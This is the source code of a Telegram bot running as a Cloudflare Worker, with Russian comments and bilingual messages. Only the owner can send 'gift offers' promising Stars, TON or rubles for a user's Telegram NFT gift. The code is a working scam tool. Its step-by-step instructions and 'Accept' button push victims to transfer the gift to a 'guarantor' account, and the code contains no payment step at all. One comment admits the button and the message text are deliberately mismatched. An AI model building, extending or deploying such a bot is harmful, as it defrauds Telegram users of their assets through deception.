// ==========================================
// НАСТРОЙКИ
// ==========================================

const ADMIN_ID = 7423713851; // Твой ID владельца
const WEBHOOK_SECRET = "DjobsOfferSecret2026"; 
const RELAYER_USERNAME = "DjobsOffer_Relayer"; // Ник гаранта

const ALLOWED_IDS = [7423713851];
const ALLOWED_USERNAMES = [];

export default {
  async fetch(request, env, ctx) {
    const BOT_TOKEN = env.BOT_TOKEN; 

    if (!BOT_TOKEN) {
      return new Response("Bot token is not configured", { status: 500 });
    }

    const secretHeader = request.headers.get("X-Telegram-Bot-Api-Secret-Token");
    if (secretHeader !== WEBHOOK_SECRET) {
      return new Response("Forbidden", { status: 403 });
    }

    if (request.method !== "POST") return new Response("OK", { status: 200 });

    try {
      const update = await request.json();

      // --- /start ---
      if (update.message && update.message.text === "/start") {
        const chatId = update.message.chat.id;
        const userId = update.message.from.id;

        const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Автор оффера присылает предложение через бота.\n2. Владелец подарка нажимает «Принять» под сообщением с оффером.\n3. Наш бот полностью бесплатный, поэтому НФТ получает гарант.\n4. Нажмите кнопку «🎁 Передать подарок» и отправьте его гаранту <b>@${RELAYER_USERNAME}</b> (НЕ автору оффера).\n5. После получения подарка гарант связывается с автором оффера для урегулирования деталей.\n\n⏳ Ограниченное время на подтверждение, таймер указан в сообщении с оффером.\n\n💡 Подарок уже у вас — ничего дополнительно покупать не требуется.`;
        
        const startMarkup = {
          inline_keyboard: [[{ text: "❓ Как принять оффер?", callback_data: "how_to_accept" }]]
        };

        await callApi("sendMessage", { chat_id: chatId, text: startText, parse_mode: "HTML", reply_markup: startMarkup }, BOT_TOKEN);
      }

      // --- INLINE (Создание офера) ---
      if (update.inline_query) {
        const iq = update.inline_query;
        const userId = iq.from.id;
        
        if (userId !== ADMIN_ID && !ALLOWED_IDS.includes(userId)) return new Response("OK", { status: 200 });

        let textQuery = iq.query.replace(/[\u00A0\u200B\u202F]/g, ' ').replace(/https?:\/\//gi, '').trim().toLowerCase(); 
        
        if (!textQuery) return new Response("OK", { status: 200 });

        let lang = "ru";
        if (textQuery.includes("eng") || textQuery.includes("en ")) {
            lang = "en";
            textQuery = textQuery.replace(/eng/g, '').trim();
        }

        const allNums = textQuery.match(/\d+/g); 
        const amount = allNums ? allNums[allNums.length - 1] : "0"; 
        
        const giftMatch = textQuery.match(/(?:https?:\/\/)?(?:t\.me\/nft\/)?[A-Za-z0-9_-]+/i); 
        let giftLink = "";
        if (giftMatch) {
            let rawGift = giftMatch[0].replace(/^https?:\/\//, '');
            if (rawGift.startsWith("t.me")) {
                giftLink = "https://" + rawGift;
            } else {
                giftLink = "https://t.me/nft/" + rawGift;
            }
        }

        let currencyType = "stars";
        let currencyDisplay = "⭐ Stars";
        
        if (textQuery.includes("gram") || textQuery.includes("ton")) {
            currencyType = "gram";
            currencyDisplay = "💎 Gram";
        } else if (textQuery.includes("rub") || textQuery.includes("руб")) {
            currencyType = "rub";
            currencyDisplay = "₽ Rub";
        }

        let senderName = iq.from.first_name || "";
        if (iq.from.last_name) senderName += " " + iq.from.last_name;
        if (!senderName) senderName = iq.from.username ? "@" + iq.from.username : "Игрок";

        let text = "";
        if (lang === "en") {
            text = `🎁 <b>Gift Offer</b>\n\n👤 <b>${senderName}</b> offers you ${amount} ${currencyDisplay} for this gift.\n\n${giftLink}\n\n⏳ The offer is valid for 5 hours 59 minutes.`;
        } else {
            text = `🎁 <b>Оффер на подарок</b>\n\n👤 <b>${senderName}</b> предлагает вам ${amount} ${currencyDisplay} за этот подарок.\n\n${giftLink}\n\n⏳ Предложение действительно 5 ч. 59 мин.`;
        }

        const results = [{
          type: "article",
          id: "1",
          title: lang === "en" ? `Offer from ${senderName}` : `Оффер от ${senderName}`,
          description: lang === "en" ? `For ${amount} ${currencyDisplay}` : `За ${amount} ${currencyDisplay}`,
          input_message_content: { message_text: text, parse_mode: "HTML" },
          reply_markup: {
            inline_keyboard: [
              [{ text: lang === "en" ? "✅ Accept" : "✅ Принять", callback_data: `acc|${amount}|${currencyType}|${giftLink}|${lang}|${senderName}` }],
              [{ text: lang === "en" ? "❌ Decline" : "❌ Отклонить", callback_data: `dec|${amount}|${currencyType}|${lang}` }]
            ]
          }
        }];

        await callApi("answerInlineQuery", { inline_query_id: iq.id, results: results, cache_time: 0 }, BOT_TOKEN);
      }

      // --- КНОПКИ ---
      if (update.callback_query) {
        const cq = update.callback_query;
        
        if (cq.data === "how_to_accept") {
          await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);

          const instructionText = `🎁 <b>Пошаговая инструкция: как принять оффер и получить средства</b>\n\n<b>Шаг 1.</b> Нажмите кнопку «Принять» под сообщением с предложением\n\n<b>Шаг 2.</b> Проверьте сумму и условия сделки\n\n<b>Шаг 3.</b> Нажмите кнопку «🎁 Передать подарок» в сообщении от бота\n\n<b>Шаг 4.</b> Откроется страница подарка — нажмите там кнопку «Передать»\n\n<b>Шаг 5.</b> Отправьте подарок нашему гаранту <b>@${RELAYER_USERNAME}</b> (НЕ автору оффера!)\n\n<b>Шаг 6.</b> Дождитесь проверки. Гарант свяжется с вами для урегулирования деталей.\n\n✅ <b>Проверка передачи:</b>\nСтатус обновляется после фактического подтверждения получения подарка гарантом.`;

          const backMarkup = {
            inline_keyboard: [[{ text: "Назад", callback_data: "back_to_start" }]]
          };

          try {
            await callApi("editMessageText", { chat_id: cq.message.chat.id, message_id: cq.message.message_id, text: instructionText, parse_mode: "HTML", reply_markup: backMarkup }, BOT_TOKEN);
          } catch (e) { console.error(e); }
        }

        if (cq.data === "back_to_start") {
          await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);

          const userId = cq.from.id;
          const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Автор оффера присылает предложение через бота.\n2. Владелец подарка нажимает «Принять» под сообщением с оффером.\n3. Наш бот полностью бесплатный, поэтому НФТ получает гарант.\n4. Нажмите кнопку «🎁 Передать подарок» и отправьте его гаранту <b>@${RELAYER_USERNAME}</b> (НЕ автору оффера).\n5. После получения подарка гарант связывается с автором оффера для урегулирования деталей.\n\n⏳ Ограниченное время на подтверждение, таймер указан в сообщении с оффером.\n\n💡 Подарок уже у вас — ничего дополнительно покупать не требуется.`;

          const startMarkup = {
            inline_keyboard: [[{ text: "❓ Как принять оффер?", callback_data: "how_to_accept" }]]
          };

          try {
            await callApi("editMessageText", { chat_id: cq.message.chat.id, message_id: cq.message.message_id, text: startText, parse_mode: "HTML", reply_markup: startMarkup }, BOT_TOKEN);
          } catch (e) { console.error(e); }
        }

        if (cq.data.startsWith("acc") || cq.data.startsWith("dec")) {
            
          const dataParts = cq.data.split("|");
          const action = dataParts[0];
          const amount = dataParts[1] || "0";
          const currencyType = dataParts[2] || "stars";
          const giftLink = dataParts[3] || ""; 
          
          let lang = "ru";
          if (action === "acc") {
              lang = dataParts[4] || "ru";
          } else {
              lang = dataParts[3] || "ru";
          }
          
          let displayCurrency = "⭐ Stars";
          if (currencyType === "gram") displayCurrency = "💎 Gram";
          if (currencyType === "rub") displayCurrency = "₽ Rub";

          const buyer = cq.from;
          let buyerName = buyer.first_name || "";
          if (buyer.last_name) buyerName += " " + buyer.last_name;

          let newText = "";
          let newMarkup = { inline_keyboard: [] };

          if (action === "acc") {
            await callApi("answerCallbackQuery", { 
              callback_query_id: cq.id, 
              text: lang === "en" ? `Offer accepted ✅\n\nClick "Gift" to open it` : `Оффер принят ✅\n\nНажмите "Передать подарок", чтобы открыть его`, 
              show_alert: true 
            }, BOT_TOKEN);
            
            // КНОПКА ВЕДЕТ НА ПОДАРОК (как в Гарисе), а в тексте пишем про гаранта
            const finalUrl = giftLink ? giftLink : ("https://t.me/" + RELAYER_USERNAME);

            if (lang === "en") {
                newText = `✅ <b>Offer accepted!</b>\n\nBuyer: <b>${buyerName}</b>\n\nTo receive ${amount} ${displayCurrency}, send the gift to our guarantor <b>@${RELAYER_USERNAME}</b>.`;
                newMarkup = { 
                  inline_keyboard: [[{ text: "🎁 Send Gift", url: finalUrl }]] 
                };
            } else {
                newText = `✅ <b>Оффер принят!</b>\n\nПокупатель: <b>${buyerName}</b>\n\nЧтобы получить ${amount} ${displayCurrency}, передайте подарок гаранту <b>@${RELAYER_USERNAME}</b>.`;
                newMarkup = { 
                  inline_keyboard: [[{ text: "🎁 Передать подарок", url: finalUrl }]] 
                };
            }
          } else {
            await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
            newText = lang === "en" ? `❌ <b>You declined the offer.</b>` : `❌ <b>Вы отказались от оффера.</b>`;
          }

          if (cq.inline_message_id) {
            try {
              if (cq.message && cq.message.caption !== undefined) {
                await callApi("editMessageCaption", { inline_message_id: cq.inline_message_id, caption: newText, parse_mode: "HTML", reply_markup: newMarkup }, BOT_TOKEN);
              } else {
                await callApi("editMessageText", { inline_message_id: cq.inline_message_id, text: newText, parse_mode: "HTML", reply_markup: newMarkup }, BOT_TOKEN);
              }
            } catch (err) { console.error("Ошибка при редактировании:", err.message); }
          } 
          else if (cq.message) {
            const chatId = cq.message.chat.id;
            const messageId = cq.message.message_id;
            try {
              await callApi("sendMessage", { chat_id: chatId, text: newText, parse_mode: "HTML", reply_markup: newMarkup }, BOT_TOKEN);
              try { await callApi("deleteMessage", { chat_id: chatId, message_id: messageId }, BOT_TOKEN); } catch (e) {}
            } catch (err) { console.error("Ошибка отправки:", err.message); }
          }
        }
      }

      return new Response("OK", { status: 200 });
    } catch (error) {
      console.error("КРИТИЧЕСКАЯ ОШИБКА:", error.message);
      return new Response("Error: " + error.message, { status: 500 });
    }
  }
};

async function callApi(method, body, token) {
  const url = `https://api.telegram.org/bot${token}/${method}`;
  try {
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body)
    });
    const data = await response.json();
    if (!data.ok) throw new Error(data.description);
    return data;
  } catch (e) {
    console.error(`Ошибка API [${method}]:`, e.message);
    throw e;
  }
}